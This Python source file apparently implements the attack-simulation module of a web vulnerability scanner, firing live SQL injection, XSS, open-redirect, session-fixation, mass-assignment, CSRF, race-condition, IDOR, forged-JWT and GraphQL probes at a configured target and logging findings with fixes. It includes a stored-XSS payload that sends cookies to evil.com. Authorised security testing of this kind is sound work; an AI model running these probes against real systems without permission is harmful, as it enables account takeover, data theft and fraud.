"""
Attack Simulation Engine
Covers two distinct roles:
  1. Exploit confirmed scanner findings (multi-step chained attacks)
  2. Cover what the scanner cannot — business-logic, session abuse,
     multi-step flows, second-order injection, race conditions, etc.
"""

import asyncio
import time
import uuid
from typing import List, Dict, Any
from urllib.parse import urljoin

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))

from shared.models import ScanConfig, TestResult, TestStatus, VulnerabilityLevel
from shared.utils import get_logger, SecurityHTTPClient

logger = get_logger(__name__)


class SimulatorEngine:
    """
    Attack simulation engine.

    Scenarios
    ---------
    basic_attacks       : Exploit scanner-confirmed low-hanging fruit
    advanced_attacks    : Chained / multi-step exploits on scanner findings
    penetration_testing : Business-logic & blind-spot coverage the scanner misses
    """

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    async def execute_simulation(
        self,
        config: ScanConfig,
        scenarios: List[str],
        simulation_id: str,
    ) -> List[TestResult]:
        logger.info(f"Starting simulation {simulation_id} for {config.target_url}")
        results: List[TestResult] = []

        scenario_map = {
            "basic_attacks":      self._simulate_basic_attacks,
            "advanced_attacks":   self._simulate_advanced_attacks,
            "penetration_testing": self._simulate_penetration_testing,
        }

        async def _run_scenario(scenario: str):
            fn = scenario_map.get(scenario)
            if not fn:
                logger.warning(f"Unknown scenario: {scenario}")
                return []
            try:
                return await fn(config, simulation_id)
            except Exception as e:
                logger.error(f"Scenario {scenario} failed: {e}")
                return []

        batches = await asyncio.gather(*[_run_scenario(s) for s in scenarios])
        results = [r for batch in batches for r in batch]

        logger.info(f"Simulation {simulation_id} completed — {len(results)} results")
        return results

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _result(
        self,
        simulation_id: str,
        tag: str,
        category: str,
        test_name: str,
        status: TestStatus,
        target_url: str,
        method: str = "GET",
        vulnerability_level: VulnerabilityLevel = None,
        payload: str = None,
        response_code: int = None,
        response_time: float = None,
        details: str = None,
        recommendations: str = None,
    ) -> TestResult:
        return TestResult(
            id=f"{simulation_id}-{tag}-{uuid.uuid4().hex[:8]}",
            category=category,
            test_name=test_name,
            status=status,
            vulnerability_level=vulnerability_level,
            target_url=target_url,
            method=method,
            payload=payload,
            response_code=response_code,
            response_time=response_time,
            service_name="simulator",
            details=details,
            recommendations=recommendations,
        )

    def _is_blocked(self, resp) -> bool:
        code = getattr(resp, "status", 0)
        body = getattr(resp, "text_content", "").lower()
        return code in (403, 429) or any(
            w in body for w in ("access denied", "blocked", "forbidden", "waf", "captcha")
        )

    # ------------------------------------------------------------------
    # Scenario 1 — Basic attacks
    # The most common scanner findings with direct single-request
    # probes: error-based SQLi confirmation, reflected XSS, open redirect,
    # and host-header injection.
    # ------------------------------------------------------------------

    async def _simulate_basic_attacks(
        self, config: ScanConfig, simulation_id: str
    ) -> List[TestResult]:
        results: List[TestResult] = []
        ic = config.get_intensity_config()

        async with SecurityHTTPClient(config) as client:

            # ── 1a. Error-based SQLi confirmation ────────────────────────
            sqli_confirm_payloads = ["'", "''", "' OR '1'='1", "1; SELECT 1"]
            sqli_targets = [
                ("/api/search/", "q", "GET", "query"),
                ("/api/users/", "id", "GET", "query"),
                ("/api/products/", "id", "GET", "query"),
                ("/api/auth/login/", "username", "POST", "form"),
            ]
            if ic["max_payloads"]:
                sqli_confirm_payloads = sqli_confirm_payloads[: ic["max_payloads"]]

            for endpoint, field, method, inject_as in sqli_targets:
                for payload in sqli_confirm_payloads:
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            method, endpoint, payload,
                            inject_as=inject_as, field_name=field,
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()
                        db_errors = [
                            "sql syntax", "mysql_fetch", "pg_query", "ora-",
                            "sqlite3", "odbc", "unclosed quotation",
                        ]
                        if self._is_blocked(resp):
                            st, lvl, detail = TestStatus.BLOCKED, None, f"SQLi probe blocked on {endpoint}"
                        elif any(e in body for e in db_errors):
                            st = TestStatus.VULNERABLE
                            lvl = VulnerabilityLevel.HIGH
                            detail = f"DB error leaked — SQLi confirmed at {endpoint} [{field}]"
                        elif code == 500:
                            st = TestStatus.VULNERABLE
                            lvl = VulnerabilityLevel.MEDIUM
                            detail = f"500 on SQLi probe at {endpoint} [{field}] — possible injection point"
                        else:
                            st, lvl, detail = TestStatus.PASSED, None, f"No SQLi indicator at {endpoint}"
                    except Exception as e:
                        elapsed = 0.0
                        st, lvl, detail = TestStatus.ERROR, None, str(e)
                        resp = None

                    results.append(self._result(
                        simulation_id, "sqli",
                        "SQL Injection — Exploit Confirmation",
                        f"SQLi probe {method} {endpoint} [{field}]",
                        st, urljoin(config.target_url, endpoint), method,
                        lvl, payload, getattr(resp, "status", None),
                        elapsed if resp else None, detail,
                        "Use parameterised queries; never concatenate user input into SQL",
                    ))

            # ── 1b. Reflected XSS confirmation ───────────────────────────
            xss_payloads = [
                "<script>alert(1)</script>",
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
            ]
            xss_targets = [
                ("/api/search/", "q", "GET", "query"),
                ("/search", "q", "GET", "query"),
                ("/api/feedback/", "message", "POST", "form"),
            ]
            if ic["max_payloads"]:
                xss_payloads = xss_payloads[: ic["max_payloads"]]

            for endpoint, field, method, inject_as in xss_targets:
                for payload in xss_payloads:
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            method, endpoint, payload,
                            inject_as=inject_as, field_name=field,
                        )
                        elapsed = time.time() - t0
                        body = getattr(resp, "text_content", "")
                        if self._is_blocked(resp):
                            st, lvl, detail = TestStatus.BLOCKED, None, f"XSS probe blocked on {endpoint}"
                        elif payload in body:
                            st = TestStatus.VULNERABLE
                            lvl = VulnerabilityLevel.HIGH
                            detail = f"Reflected XSS confirmed — payload echoed unencoded at {endpoint}"
                        else:
                            st, lvl, detail = TestStatus.PASSED, None, f"XSS payload not reflected at {endpoint}"
                    except Exception as e:
                        elapsed = 0.0
                        st, lvl, detail = TestStatus.ERROR, None, str(e)
                        resp = None

                    results.append(self._result(
                        simulation_id, "xss",
                        "XSS — Exploit Confirmation",
                        f"XSS probe {method} {endpoint} [{field}]",
                        st, urljoin(config.target_url, endpoint), method,
                        lvl, payload, getattr(resp, "status", None),
                        elapsed if resp else None, detail,
                        "Encode all output; enforce strict CSP; use HTTPOnly cookies",
                    ))

            # ── 1c. Open redirect ─────────────────────────────────────────
            redirect_payloads = [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https://evil.com%2F@legitimate.com",
            ]
            redirect_params = [
                ("/api/auth/logout/", "next"),
                ("/api/auth/login/",  "redirect"),
                ("/redirect",         "url"),
                ("/goto",             "to"),
            ]
            for endpoint, param in redirect_params:
                for payload in redirect_payloads[:2]:
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            "GET", endpoint, payload,
                            inject_as="query", field_name=param,
                            allow_redirects=False,
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        location = (getattr(resp, "headers", {}) or {}).get("location", "")
                        if code in (301, 302, 303, 307, 308) and "evil.com" in location:
                            st = TestStatus.VULNERABLE
                            lvl = VulnerabilityLevel.MEDIUM
                            detail = f"Open redirect confirmed — Location: {location}"
                        else:
                            st, lvl, detail = TestStatus.PASSED, None, f"No open redirect at {endpoint}?{param}"
                    except Exception as e:
                        elapsed = 0.0
                        st, lvl, detail = TestStatus.ERROR, None, str(e)
                        resp = None

                    results.append(self._result(
                        simulation_id, "redirect",
                        "Open Redirect",
                        f"Open redirect {endpoint} [{param}]",
                        st, urljoin(config.target_url, endpoint), "GET",
                        lvl, payload, getattr(resp, "status", None),
                        elapsed if resp else None, detail,
                        "Validate redirect targets against an allowlist; never reflect raw user input as Location",
                    ))

            # ── 1d. Host header injection ─────────────────────────────────
            host_payloads = [
                "evil.com",
                "evil.com:80",
                "legitimate.com.evil.com",
            ]
            for payload in host_payloads:
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        "GET", "/api/password-reset/",
                        headers={"Host": payload},
                    )
                    elapsed = time.time() - t0
                    body = getattr(resp, "text_content", "").lower()
                    if payload.lower() in body:
                        st = TestStatus.VULNERABLE
                        lvl = VulnerabilityLevel.HIGH
                        detail = f"Host header reflected in response body — password-reset link poisoning possible"
                    else:
                        st, lvl, detail = TestStatus.PASSED, None, "Host header not reflected"
                except Exception as e:
                    elapsed = 0.0
                    st, lvl, detail = TestStatus.ERROR, None, str(e)
                    resp = None

                results.append(self._result(
                    simulation_id, "hosthdr",
                    "Host Header Injection",
                    f"Host header injection [{payload}]",
                    st, urljoin(config.target_url, "/api/password-reset/"), "GET",
                    lvl, payload, getattr(resp, "status", None),
                    elapsed if resp else None, detail,
                    "Validate Host header against a whitelist; never use it to build URLs",
                ))

        return results

    # ------------------------------------------------------------------
    # Scenario 2 — Advanced attacks
    # Multi-step chained exploits the scanner cannot do in a single pass:
    # second-order SQLi, stored XSS retrieval, session fixation,
    # privilege escalation via mass-assignment, and CSRF token bypass.
    # ------------------------------------------------------------------

    async def _simulate_advanced_attacks(
        self, config: ScanConfig, simulation_id: str
    ) -> List[TestResult]:
        results: List[TestResult] = []

        async with SecurityHTTPClient(config) as client:

            # ── 2a. Second-order SQLi ─────────────────────────────────────
            # Step 1: register a user whose username contains a SQLi payload.
            # Step 2: trigger a feature that reads that username back into a query.
            poison_username = "admin'--"
            t0 = time.time()
            try:
                reg_resp = await client.make_async_request(
                    "POST", "/api/auth/register/",
                    json_body={
                        "username": poison_username,
                        "email": "sim_probe@example.com",
                        "password": "Probe!2024",
                    },
                    inject_as="json",
                )
                # Now trigger a profile lookup that may re-use the stored username
                lookup_resp = await client.make_async_request(
                    "GET", "/api/users/",
                    payload=poison_username,
                    inject_as="query", field_name="username",
                )
                elapsed = time.time() - t0
                body = getattr(lookup_resp, "text_content", "").lower()
                db_errors = ["sql syntax", "mysql_fetch", "pg_query", "ora-", "sqlite3"]
                if any(e in body for e in db_errors):
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.CRITICAL
                    detail = "Second-order SQLi confirmed — stored payload triggered DB error on retrieval"
                elif getattr(lookup_resp, "status", 0) == 500:
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.HIGH
                    detail = "Second-order SQLi likely — 500 on retrieval of stored payload"
                else:
                    st, lvl, detail = TestStatus.PASSED, None, "No second-order SQLi indicator"
            except Exception as e:
                elapsed = 0.0
                st, lvl, detail = TestStatus.ERROR, None, str(e)

            results.append(self._result(
                simulation_id, "2nd-sqli",
                "Second-Order SQL Injection",
                "Store SQLi payload then trigger retrieval",
                st, urljoin(config.target_url, "/api/auth/register/"), "POST",
                lvl, poison_username, None, elapsed, detail,
                "Parameterise every query that reads stored data, not just input-time queries",
            ))

            # ── 2b. Stored XSS retrieval ──────────────────────────────────
            # Step 1: POST a comment/message with an XSS payload.
            # Step 2: GET the page that renders those comments.
            xss_payload = "<script>document.location='https://evil.com?c='+document.cookie</script>"
            t0 = time.time()
            try:
                post_resp = await client.make_async_request(
                    "POST", "/api/comments/",
                    json_body={"content": xss_payload, "post_id": 1},
                    inject_as="json",
                )
                get_resp = await client.make_async_request("GET", "/api/comments/")
                elapsed = time.time() - t0
                body = getattr(get_resp, "text_content", "")
                if xss_payload in body:
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.CRITICAL
                    detail = "Stored XSS confirmed — payload persisted and returned unencoded"
                elif "<script" in body.lower():
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.HIGH
                    detail = "Possible stored XSS — <script> tag present in comments response"
                else:
                    st, lvl, detail = TestStatus.PASSED, None, "XSS payload not stored or was encoded"
            except Exception as e:
                elapsed = 0.0
                st, lvl, detail = TestStatus.ERROR, None, str(e)

            results.append(self._result(
                simulation_id, "stored-xss",
                "Stored XSS",
                "POST XSS payload then GET rendering page",
                st, urljoin(config.target_url, "/api/comments/"), "POST",
                lvl, xss_payload, None, elapsed, detail,
                "HTML-encode all stored user content on output; enforce strict CSP",
            ))

            # ── 2c. Session fixation ──────────────────────────────────────
            # Provide a known session ID before login; check if it's accepted post-login.
            fixed_session = "FIXED_SESSION_ID_12345"
            t0 = time.time()
            try:
                login_resp = await client.make_async_request(
                    "POST", "/api/auth/login/",
                    json_body={"username": "probe", "password": "probe"},
                    headers={"Cookie": f"sessionid={fixed_session}"},
                    inject_as="json",
                )
                elapsed = time.time() - t0
                set_cookie = (getattr(login_resp, "headers", {}) or {}).get("set-cookie", "")
                if fixed_session in set_cookie or (
                    getattr(login_resp, "status", 0) == 200 and not set_cookie
                ):
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.HIGH
                    detail = "Session fixation possible — server did not rotate session ID after login"
                else:
                    st, lvl, detail = TestStatus.PASSED, None, "Session ID rotated after login"
            except Exception as e:
                elapsed = 0.0
                st, lvl, detail = TestStatus.ERROR, None, str(e)

            results.append(self._result(
                simulation_id, "sess-fix",
                "Session Fixation",
                "Supply fixed session ID before login, check post-login",
                st, urljoin(config.target_url, "/api/auth/login/"), "POST",
                lvl, fixed_session, None, elapsed, detail,
                "Always issue a new session ID on authentication; invalidate pre-auth sessions",
            ))

            # ── 2d. Mass assignment / privilege escalation ────────────────
            # POST extra privileged fields alongside a normal update.
            escalation_bodies = [
                {"role": "admin", "is_admin": True},
                {"permissions": ["read", "write", "admin"]},
                {"user_type": "superuser", "verified": True},
                {"credits": 999999, "subscription": "premium"},
            ]
            for body in escalation_bodies:
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        "PUT", "/api/users/profile/",
                        json_body=body, inject_as="json",
                    )
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    resp_body = getattr(resp, "text_content", "").lower()
                    if code == 200 and any(k in resp_body for k in ("admin", "superuser", "premium")):
                        st = TestStatus.VULNERABLE
                        lvl = VulnerabilityLevel.CRITICAL
                        detail = f"Mass assignment accepted — privileged fields written: {list(body.keys())}"
                    elif code in (400, 403, 422):
                        st, lvl, detail = TestStatus.PASSED, None, f"Mass assignment rejected ({code})"
                    else:
                        st, lvl, detail = TestStatus.PASSED, None, f"No privilege escalation indicator ({code})"
                except Exception as e:
                    elapsed = 0.0
                    st, lvl, detail = TestStatus.ERROR, None, str(e)
                    resp = None

                results.append(self._result(
                    simulation_id, "mass-assign",
                    "Mass Assignment / Privilege Escalation",
                    f"PUT privileged fields {list(body.keys())}",
                    st, urljoin(config.target_url, "/api/users/profile/"), "PUT",
                    lvl, str(body), getattr(resp, "status", None) if resp else None,
                    elapsed, detail,
                    "Use explicit allowlists for writable fields; never bind raw request bodies to models",
                ))

            # ── 2e. CSRF token bypass ─────────────────────────────────────
            # Attempt state-changing POST with no CSRF token, wrong token, and
            # a token from a different session.
            csrf_cases = [
                ("No CSRF token",      {}),
                ("Wrong CSRF token",   {"X-CSRFToken": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}),
                ("Empty CSRF token",   {"X-CSRFToken": ""}),
            ]
            for label, extra_headers in csrf_cases:
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        "POST", "/api/users/profile/",
                        json_body={"display_name": "csrf_probe"},
                        headers=extra_headers,
                        inject_as="json",
                    )
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    if code == 403:
                        st, lvl, detail = TestStatus.PASSED, None, f"CSRF protection active — {label} rejected"
                    elif code == 200:
                        st = TestStatus.VULNERABLE
                        lvl = VulnerabilityLevel.HIGH
                        detail = f"CSRF bypass — state-changing POST accepted with {label}"
                    else:
                        st, lvl, detail = TestStatus.PASSED, None, f"Response {code} for {label}"
                except Exception as e:
                    elapsed = 0.0
                    st, lvl, detail = TestStatus.ERROR, None, str(e)
                    resp = None

                results.append(self._result(
                    simulation_id, "csrf",
                    "CSRF Token Bypass",
                    label,
                    st, urljoin(config.target_url, "/api/users/profile/"), "POST",
                    lvl, label, getattr(resp, "status", None) if resp else None,
                    elapsed, detail,
                    "Enforce CSRF tokens on all state-changing endpoints; use SameSite=Strict cookies",
                ))

        return results

    # ------------------------------------------------------------------
    # Scenario 3 — Penetration testing
    # Covers blind spots the scanner cannot reach:
    # race conditions, IDOR via object enumeration, insecure direct
    # object references on file downloads, HTTP verb tampering,
    # JWT algorithm confusion (RS256→HS256), and GraphQL introspection.
    # ------------------------------------------------------------------

    async def _simulate_penetration_testing(
        self, config: ScanConfig, simulation_id: str
    ) -> List[TestResult]:
        results: List[TestResult] = []

        async with SecurityHTTPClient(config) as client:

            # ── 3a. Race condition on coupon / credit redemption ──────────
            # Fire the same redemption request concurrently; if the server
            # doesn't use atomic operations, multiple redemptions succeed.
            race_endpoint = "/api/coupons/redeem/"
            race_body = {"code": "SAVE10", "user_id": 1}
            concurrency = 10
            t0 = time.time()
            try:
                tasks = [
                    client.make_async_request(
                        "POST", race_endpoint,
                        json_body=dict(race_body),
                        inject_as="json",
                    )
                    for _ in range(concurrency)
                ]
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                elapsed = time.time() - t0
                successes = sum(
                    1 for r in responses
                    if not isinstance(r, Exception) and getattr(r, "status", 0) == 200
                )
                if successes > 1:
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.HIGH
                    detail = (
                        f"Race condition confirmed — {successes}/{concurrency} "
                        f"concurrent redemptions succeeded"
                    )
                else:
                    st, lvl, detail = TestStatus.PASSED, None, (
                        f"Race condition not triggered — only {successes}/{concurrency} succeeded"
                    )
            except Exception as e:
                elapsed = 0.0
                st, lvl, detail = TestStatus.ERROR, None, str(e)

            results.append(self._result(
                simulation_id, "race",
                "Race Condition",
                f"Concurrent coupon redemption x{concurrency}",
                st, urljoin(config.target_url, race_endpoint), "POST",
                lvl, str(race_body), None, elapsed, detail,
                "Use database-level atomic operations or distributed locks for one-time actions",
            ))

            # ── 3b. IDOR — sequential object enumeration ──────────────────
            # Access other users' resources by iterating numeric IDs.
            idor_endpoints = [
                ("/api/users/{id}/",          "User profile"),
                ("/api/orders/{id}/",         "Order details"),
                ("/api/invoices/{id}/",       "Invoice"),
                ("/api/messages/{id}/",       "Private message"),
                ("/api/documents/{id}/",      "Document"),
            ]
            for template, label in idor_endpoints:
                vulnerable_ids: list = []
                for obj_id in range(1, 6):
                    endpoint = template.replace("{id}", str(obj_id))
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request("GET", endpoint)
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        if code == 200:
                            vulnerable_ids.append(obj_id)
                    except Exception:
                        pass

                if vulnerable_ids:
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.HIGH
                    detail = f"IDOR — {label} accessible without ownership check: IDs {vulnerable_ids}"
                else:
                    st, lvl, detail = TestStatus.PASSED, None, f"IDOR not detected for {label}"

                results.append(self._result(
                    simulation_id, "idor",
                    "IDOR — Object Enumeration",
                    f"Enumerate {label} IDs 1-5",
                    st, urljoin(config.target_url, template.replace("{id}", "1")), "GET",
                    lvl, None, None, None, detail,
                    "Enforce object-level authorisation on every endpoint; use UUIDs instead of sequential IDs",
                ))

            # ── 3c. HTTP verb tampering ───────────────────────────────────
            # Some frameworks only protect POST; try PUT/PATCH/DELETE on
            # endpoints that should require auth.
            verb_targets = [
                ("/api/users/1/",    ["PUT", "PATCH", "DELETE"]),
                ("/api/admin/",      ["GET", "POST", "DELETE"]),
                ("/api/settings/",   ["PUT", "DELETE"]),
            ]
            for endpoint, verbs in verb_targets:
                for verb in verbs:
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(verb, endpoint)
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        if code not in (401, 403, 404, 405):
                            st = TestStatus.VULNERABLE
                            lvl = VulnerabilityLevel.MEDIUM
                            detail = f"HTTP verb tampering — {verb} {endpoint} returned {code}"
                        else:
                            st, lvl, detail = TestStatus.PASSED, None, f"{verb} {endpoint} correctly rejected ({code})"
                    except Exception as e:
                        elapsed = 0.0
                        st, lvl, detail = TestStatus.ERROR, None, str(e)
                        resp = None

                    results.append(self._result(
                        simulation_id, "verb",
                        "HTTP Verb Tampering",
                        f"{verb} {endpoint}",
                        st, urljoin(config.target_url, endpoint), verb,
                        lvl, None, getattr(resp, "status", None) if resp else None,
                        elapsed, detail,
                        "Explicitly restrict allowed HTTP methods per endpoint; return 405 for disallowed verbs",
                    ))

            # ── 3d. JWT RS256 → HS256 algorithm confusion ─────────────────
            # If the server uses RS256, an attacker can sign a token with
            # HS256 using the public key as the HMAC secret.
            # We send a crafted token and check if it's accepted.
            confused_jwt = (
                # header: {"typ":"JWT","alg":"HS256"}
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
                # payload: {"user_id":1,"role":"admin","exp":9999999999}
                ".eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9"
                # signature: HMAC-SHA256 of above using literal string "public_key"
                ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            )
            t0 = time.time()
            try:
                resp = await client.make_async_request(
                    "GET", "/api/users/profile/",
                    headers={"Authorization": f"Bearer {confused_jwt}"},
                )
                elapsed = time.time() - t0
                code = getattr(resp, "status", 0)
                body = getattr(resp, "text_content", "").lower()
                if code == 200 and any(k in body for k in ("user_id", "email", "profile", "role")):
                    st = TestStatus.VULNERABLE
                    lvl = VulnerabilityLevel.CRITICAL
                    detail = "JWT algorithm confusion (RS256→HS256) accepted — auth bypass confirmed"
                else:
                    st, lvl, detail = TestStatus.PASSED, None, f"JWT algorithm confusion rejected ({code})"
            except Exception as e:
                elapsed = 0.0
                st, lvl, detail = TestStatus.ERROR, None, str(e)
                resp = None

            results.append(self._result(
                simulation_id, "jwt-alg",
                "JWT Algorithm Confusion (RS256→HS256)",
                "Send HS256-signed token to RS256 endpoint",
                st, urljoin(config.target_url, "/api/users/profile/"), "GET",
                lvl, confused_jwt[:40] + "...", getattr(resp, "status", None) if resp else None,
                elapsed, detail,
                "Pin the expected algorithm server-side; never accept alg from the token header",
            ))

            # ── 3e. GraphQL introspection & batch query abuse ─────────────
            graphql_endpoints = ["/graphql", "/api/graphql", "/graphql/"]
            introspection_query = '{"query":"{__schema{types{name}}}"}'
            batch_query = '[{"query":"{user(id:1){email}}"}, {"query":"{user(id:2){email}}"}]'

            for gql_endpoint in graphql_endpoints:
                # Introspection
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        "POST", gql_endpoint,
                        raw_body=introspection_query.encode(),
                        headers={"Content-Type": "application/json"},
                    )
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    body = getattr(resp, "text_content", "").lower()
                    if code == 200 and "__schema" in body:
                        st = TestStatus.VULNERABLE
                        lvl = VulnerabilityLevel.MEDIUM
                        detail = f"GraphQL introspection enabled at {gql_endpoint} — schema exposed"
                    elif code in (400, 403, 404):
                        st, lvl, detail = TestStatus.PASSED, None, f"GraphQL introspection disabled or endpoint absent ({code})"
                    else:
                        st, lvl, detail = TestStatus.PASSED, None, f"No GraphQL introspection response ({code})"
                except Exception as e:
                    elapsed = 0.0
                    st, lvl, detail = TestStatus.ERROR, None, str(e)
                    resp = None

                results.append(self._result(
                    simulation_id, "gql-intro",
                    "GraphQL Introspection",
                    f"Introspection query at {gql_endpoint}",
                    st, urljoin(config.target_url, gql_endpoint), "POST",
                    lvl, introspection_query, getattr(resp, "status", None) if resp else None,
                    elapsed, detail,
                    "Disable introspection in production; implement query depth/complexity limits",
                ))

                # Batch query abuse
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        "POST", gql_endpoint,
                        raw_body=batch_query.encode(),
                        headers={"Content-Type": "application/json"},
                    )
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    body = getattr(resp, "text_content", "")
                    if code == 200 and body.strip().startswith("["):
                        st = TestStatus.VULNERABLE
                        lvl = VulnerabilityLevel.MEDIUM
                        detail = f"GraphQL batch queries accepted at {gql_endpoint} — DoS / data harvesting risk"
                    else:
                        st, lvl, detail = TestStatus.PASSED, None, f"Batch queries not accepted ({code})"
                except Exception as e:
                    elapsed = 0.0
                    st, lvl, detail = TestStatus.ERROR, None, str(e)
                    resp = None

                results.append(self._result(
                    simulation_id, "gql-batch",
                    "GraphQL Batch Query Abuse",
                    f"Batch query at {gql_endpoint}",
                    st, urljoin(config.target_url, gql_endpoint), "POST",
                    lvl, batch_query, getattr(resp, "status", None) if resp else None,
                    elapsed, detail,
                    "Disable or rate-limit batch queries; enforce per-query complexity limits",
                ))

            # ── 3f. Insecure file download (path + UUID bypass) ───────────
            # Try to download files belonging to other users by guessing
            # predictable paths or bypassing UUID checks.
            download_probes = [
                ("/api/files/download/1",          "Sequential ID"),
                ("/api/files/download/2",          "Sequential ID"),
                ("/api/exports/report_1.pdf",      "Predictable filename"),
                ("/api/exports/report_2.pdf",      "Predictable filename"),
                ("/api/invoices/INV-0001.pdf",     "Predictable invoice"),
                ("/api/invoices/INV-0002.pdf",     "Predictable invoice"),
            ]
            for endpoint, label in download_probes:
                t0 = time.time()
                try:
                    resp = await client.make_async_request("GET", endpoint)
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    content_type = (getattr(resp, "headers", {}) or {}).get("content-type", "")
                    if code == 200 and any(t in content_type for t in ("pdf", "octet", "download")):
                        st = TestStatus.VULNERABLE
                        lvl = VulnerabilityLevel.HIGH
                        detail = f"Insecure direct file download — {label} at {endpoint} returned file without auth check"
                    elif code in (401, 403, 404):
                        st, lvl, detail = TestStatus.PASSED, None, f"{label} properly protected ({code})"
                    else:
                        st, lvl, detail = TestStatus.PASSED, None, f"No file returned ({code})"
                except Exception as e:
                    elapsed = 0.0
                    st, lvl, detail = TestStatus.ERROR, None, str(e)
                    resp = None

                results.append(self._result(
                    simulation_id, "file-dl",
                    "Insecure Direct File Download",
                    f"{label}: {endpoint}",
                    st, urljoin(config.target_url, endpoint), "GET",
                    lvl, None, getattr(resp, "status", None) if resp else None,
                    elapsed, detail,
                    "Verify file ownership server-side on every download; use signed short-lived URLs",
                ))

        return results
